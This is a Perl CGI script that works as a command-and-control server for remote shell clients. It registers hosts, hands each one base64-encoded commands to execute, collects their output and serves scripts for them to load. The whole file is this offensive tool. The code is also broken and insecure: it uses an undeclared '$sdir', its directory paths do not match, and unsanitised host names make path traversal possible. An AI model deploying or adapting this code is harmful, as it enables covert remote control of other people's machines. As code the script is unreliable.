#!/usr/bin/perl
#
# a cgi multi shell handler
#
# functions as a comm channel for clients by 
# printing base64 encoded commands to a web page for 
# parsing by client application, Use with https to 
# help prevent request tampering.
# 				   xor-function 
# license GPLv3 

use CGI;
use strict;
use warnings;
use File::Path qw(make_path remove_tree);
use MIME::Base64;

$CGI::POST_MAX=1024 * 2000;

# decodes a url safe bas64 encoded string 
sub proc_decurl {

        my $raw_string = $_[0];
        $raw_string =~ tr/!/=/;
        $raw_string =~ tr/_/\//;
        $raw_string =~ tr/-/+/;
        my $dec_string = decode_base64($raw_string);

        return $dec_string;
}

# encodes command with base64 before printing to webpage
sub proc_enccmd {

	my $string = $_[0];
	my $enc_string = encode_base64($string);

	return $enc_string;

}

# generates random string 
sub rstring {

        my @chr = ("A".."Z", "a".."z");
        my $rloop = int(35);
        my $rstring;

        while ($rloop != 0) {

                $rstring .= $chr[int(rand(52))];
                $rloop--;
        }

        return $rstring;

}

# check if file exits then compares contents of file with supplied key
# returns a success or failure
sub auth_client {

	my $cgi  = $_[0];
	my $auth_file = $_[1];

        # Authentication here
        if (!defined($cgi->param('auth'))) { die "[!] fail!\n"; }
	my $rawkey = $cgi->param('auth');

        my $key = proc_decurl($rawkey);

	chomp($key);

	open(my $fh, '<', $auth_file);
		my $line = <$fh>;
	close $fh;

	my $output = $line;

	chomp($output);

	if ( $output eq $key ) { return "win"; }
	else { return "fail"; } 

}

# subroutine that handles parameters
sub get_param{

	my $cdir = "/var/systems/";
	my $pass = "init-pass";
	my $pass_file = $cdir . $pass;
	my $param_out;

	# my $sanitize = "a-zA-Z0-9_.-";

	# create cgi object
	my $q = CGI->new();

	# Accepted params, ignore anything else
	if (defined( $q->param('reg')) ) {

		# Authentication here
		my $reg_status = auth_client($q, $pass_file);
		if ( $reg_status eq 'fail' ) { die "[!] fail!\n"; } 

                my $enc_new_host = $q->param('reg');
		my $new_host = proc_decurl($enc_new_host);
		my $full_path = $cdir . $new_host;

	        # setup dir struct for specific host	
		if ( ! -d $full_path ) { 

			make_path($full_path) or die "folder creation failed\n";

			my $cmdfilepath = $full_path . '/command';

			open(my $fh, '+>', "$cmdfilepath" );
				print $fh "echo 77774444\n"; 
			close $fh;

			my $outfilepath = $full_path . '/stdout';

                        open( $fh, '+>', "$outfilepath" );
                                print $fh "\n";
                        close $fh;

			$param_out = $new_host . ' host set';

		} else { 
			$param_out = 'hostname already present'; 
		} 

	} # get parameter asks server for current command to execute  
	elsif (defined( $q->param('get')) ) {
		
		# Authentication here
                my $get_status = auth_client($q, $pass_file);
                if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }

		# printing command
		my $enc_host = $q->param('get');
		my $host = proc_decurl($enc_host);
		my $full_path = $cdir . $host;
		my $filepath = $full_path . '/command';

		if ( -e $filepath ) { 		

			open(my $fh, '<', $filepath);
				my $line = <$fh>;
			close $fh;

			$param_out = $line;
		}

	}
	elsif (defined($q->param('data'))) {
		
		# setup authentication here
                my $get_status = auth_client($q, $pass_file);
                if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }

		if (!defined($q->param('host'))) { die "[!] no hostname found!\n"; }

                my $enc_data = $q->param('data');
		my $data = proc_decurl($enc_data);

		my $enc_host = $q->param('host');
		my $host = proc_decurl($enc_host);

                my $full_path = $cdir . $host;
                my $filepath = $full_path . '/stdout';

		if ( -e $full_path ) { 

                	open(my $fh, '+>', $filepath);
				print $fh $data;
				print $fh "\n";
			close $fh;

			$param_out = 'updated stdout for ' . $host . "\n";
		}

	}
	elsif (defined( $q->param('ld')) ) {

                # basic auth here
                my $get_status = auth_client($q, $pass_file);
                if ( $get_status eq 'fail' ) { die "[!] fail!\n"; }

                # printing command
                my $enc_script  = $q->param('ld');
                my $script      = proc_decurl($enc_script);
                my $filepath    = $sdir . $script;

                # load entire script into single variable  
                if ( -e $filepath ) {

                        my $code;
                        {
                                open my $fh, '<', $filepath;
                                $code = do { local $/; <$fh> };
                        }
                        $param_out = $code;
                }

        }  # Trap to catch unwanted request types
	else { 
		return; 
	}

	return $param_out;

}

# subroutine parameter wrapper 
sub main { 

	my @params = @_;

	# perform encoding before printing to page
	my $result = get_param(@params);
	if (!defined($result)) {
		print '404 not found...' . "\n"; 
	}
	 else { 
		my $enc_cmd = proc_enccmd($result);
		print $enc_cmd; 
	}
	
}

# Insure these files exist or fail to run
if ( ! -d '/var/async-shell/' ) { die '[!] the async-shell folder was not found in /var !' . "\n"; }
if ( ! -e '/var/async-shell/systems/init-pass' ) { die '[!] init-pass file was not found in /var/async-shell/systems/ !' . "\n"; }

# run main
main(@ARGV);
